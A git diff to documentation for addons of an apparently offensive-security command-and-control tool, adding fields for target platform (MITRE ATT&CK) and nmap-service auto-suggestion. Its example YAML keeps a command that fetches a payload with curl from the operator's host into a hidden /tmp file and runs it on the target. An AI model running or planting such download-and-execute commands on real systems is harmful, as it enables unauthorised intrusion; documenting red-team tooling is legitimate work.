@@ -39,6 +39,10 @@ category: "10. Command & Control"   # Must match an existing CLI category
 ```yaml
 author: Author Name
 version: "1.0"
+os: linux                    # MITRE platform the addon targets (see table below)
+trigger:                     # nmap service names that auto-suggest this addon
+  - microsoft-ds
+  - ldap
 params:
   - name: lhost
     type: string
@@ -54,6 +58,38 @@ tool:
   lazycommand: |               # Command to run on the target
     curl -sk "http://{lhost}:{lport}/payload" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
 ```
+
+### `os` field — MITRE ATT&CK platform
+
+Declares the victim platform the addon targets. Consumed by `do_explore`,
+`do_recommend_next`, and `do_suggest_next` to filter out addons that
+cannot run against the active engagement. Accepted values:
+
+| Value | Meaning |
+|-------|---------|
+| `any` | Operator-side / cross-platform (default) — never filtered out |
+| `linux` | Linux victims (ELF, kernel exploits, native loaders) |
+| `windows` | Windows victims (PE/DLL, BOFs, PowerShell payloads) |
+| `macos` | macOS victims |
+| `network` | Network appliances / protocol-level attacks |
+| `containers` | Docker / Kubernetes targets |
+| `saas` | SaaS abuse (Office 365, GitHub, etc.) |
+| `iaas` | Cloud control planes (AWS, Azure, GCP) |
+
+Unknown values fall back to `any` with a warning at load time.
+
+### `trigger` field — nmap service auto-suggest
+
+List of nmap service names (e.g. `microsoft-ds`, `http`, `ldap`) that
+should cause the exploration engine to surface this addon when those
+services appear in a `sessions/scan_*.nmap.xml`. Special values:
+
+- `[all]` — match every discovered service (broad scanners).
+- `[]` or omitted — addon is never auto-suggested by service discovery
+  (manual / strategic tools, AI agents, frameworks).
+
+The matcher is case-insensitive. Triggers do not fabricate evidence:
+only declare services the addon genuinely operates against.
 
 ### Parameter substitution tokens
 
